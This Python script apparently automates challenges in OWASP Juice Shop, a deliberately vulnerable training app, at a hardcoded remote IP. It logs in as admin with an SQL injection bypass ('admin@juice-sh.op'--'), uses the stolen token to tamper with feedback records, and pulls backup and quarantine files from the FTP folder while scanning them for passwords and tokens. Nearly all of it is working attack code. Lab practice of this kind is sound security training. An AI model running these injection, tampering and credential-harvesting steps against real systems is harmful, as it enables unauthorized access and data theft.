#!/usr/bin/env python3
"""
Quick solve for multiple challenges with simple approaches
"""

import requests
import time

TARGET = "http://66.42.93.220:3000"

def quick_solve_all():
    """Quickly trigger all the challenges"""
    
    print("⚡ QUICK CHALLENGE SOLVER")
    print("=" * 60)
    
    session = requests.Session()
    
    # Login as admin first
    print("\n1️⃣ Logging in...")
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("   ✅ Logged in")
    
    # 1. Missing Encoding - Access emoji image
    print("\n2️⃣ Missing Encoding challenge...")
    emoji_url = f"{TARGET}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
    try:
        resp = session.get(emoji_url, timeout=5)
        print(f"   Accessed emoji image: {resp.status_code}")
        if resp.status_code == 200:
            print("   ✅ Missing Encoding should be solved")
    except:
        print("   ⚠️ Timeout accessing emoji image")
    
    # 2. Web3 Sandbox - Just access the route
    print("\n3️⃣ Web3 Sandbox challenge...")
    try:
        resp = session.get(f"{TARGET}/#/web3", timeout=5)
        print(f"   Accessed Web3 Sandbox: {resp.status_code}")
    except:
        print("   ⚠️ Timeout accessing Web3")
    
    # Alternative approach - access via main.js
    try:
        resp = session.get(f"{TARGET}/main.js", timeout=5)
        if 'web3' in resp.text.lower():
            print("   Found Web3 references in main.js")
    except:
        pass
    
    # 3. Zero Stars - Submit 0 star feedback
    print("\n4️⃣ Zero Stars challenge...")
    
    # Try multiple approaches
    feedback_endpoints = [
        (f"{TARGET}/api/Feedbacks/", {"comment": "Zero stars", "rating": 0}),
        (f"{TARGET}/api/Feedbacks", {"comment": "Zero", "rating": 0, "captcha": "0", "captchaId": 0}),
        (f"{TARGET}/rest/feedback", {"comment": "Zero stars test", "rating": 0})
    ]
    
    for url, data in feedback_endpoints:
        try:
            resp = session.post(url, json=data, timeout=5)
            print(f"   {url}: {resp.status_code}")
            if resp.status_code in [200, 201]:
                print("   ✅ Zero Stars feedback submitted")
                break
        except:
            pass
    
    # Alternative: Try PUT request with rating 0
    try:
        # Get existing feedbacks
        resp = session.get(f"{TARGET}/api/Feedbacks/")
        if resp.status_code == 200:
            feedbacks = resp.json().get('data', [])
            if feedbacks:
                # Update first feedback to 0 stars
                feedback_id = feedbacks[0].get('id')
                update_resp = session.put(
                    f"{TARGET}/api/Feedbacks/{feedback_id}",
                    json={"rating": 0}
                )
                print(f"   Updated feedback {feedback_id} to 0 stars: {update_resp.status_code}")
    except:
        pass
    
    # 4. Exposed Credentials - Check various locations
    print("\n5️⃣ Exposed Credentials challenge...")
    
    # Check FTP for exposed files
    exposed_files = [
        f"{TARGET}/ftp/package.json.bak",
        f"{TARGET}/ftp/coupons_2013.md.bak", 
        f"{TARGET}/ftp/quarantine/juicy_malware_linux_amd_64.url",
        f"{TARGET}/ftp/legal.md"
    ]
    
    for file_url in exposed_files:
        try:
            resp = session.get(file_url, timeout=5)
            if resp.status_code == 200:
                print(f"   Found exposed file: {file_url}")
                content = resp.text
                if 'password' in content.lower() or 'token' in content.lower():
                    print("   ✅ Found exposed credentials")
        except:
            pass
    
    # 5. Admin Section - Just navigate to it
    print("\n6️⃣ Admin Section challenge...")
    try:
        resp = session.get(f"{TARGET}/#/administration", timeout=5)
        print(f"   Accessed Admin Section: {resp.status_code}")
    except:
        pass
    
    # Check final status
    print("\n📊 Checking challenge status...")
    
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        
        target_names = [
            "Missing Encoding",
            "Web3 Sandbox",
            "Zero Stars", 
            "Exposed Credentials",
            "Admin Section",
            "Mass Dispel"
        ]
        
        print("\nTarget Challenges Status:")
        for name in target_names:
            challenge = next((c for c in challenges if name in c.get('name', '')), None)
            if challenge:
                status = "✅" if challenge.get('solved') else "❌"
                diff = challenge.get('difficulty', '?')
                print(f"   {status} {name:<25} [{diff}⭐]")
        
        solved = sum(1 for c in challenges if c.get('solved'))
        total = len(challenges)
        print(f"\n   Total Progress: {solved}/{total} ({solved*100//total}%)")

if __name__ == "__main__":
    quick_solve_all()